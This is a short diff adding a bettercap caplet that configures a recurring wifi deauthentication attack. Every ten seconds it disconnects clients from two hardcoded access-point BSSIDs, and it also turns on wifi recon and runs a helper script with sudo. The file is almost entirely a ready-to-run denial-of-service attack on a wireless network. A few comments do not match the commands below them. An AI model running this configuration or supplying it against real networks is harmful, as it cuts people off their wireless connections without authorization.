@@ -1,0 +1,18 @@
+set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+
+# ensure wifi is in the right mode
+!sudo /usr/local/bin/fix-bettercap.sh
+
+# every 10 seconds deauth every client from every ap
+set ticker.period 10
+# These are the BSSID of the target access point (2.4GHz and 5GHz)
+set ticker.commands wifi.deauth 94:83:C4:02:1D:FC; wifi.deauth 94:83:C4:02:1D:FB
+
+# uncomment to only hop on these channels:
+wifi.recon.channel 36
+
+wifi.recon on
+ticker on
+events.clear
+clear
+!sudo /usr/local/bin/fix-bettercap.sh
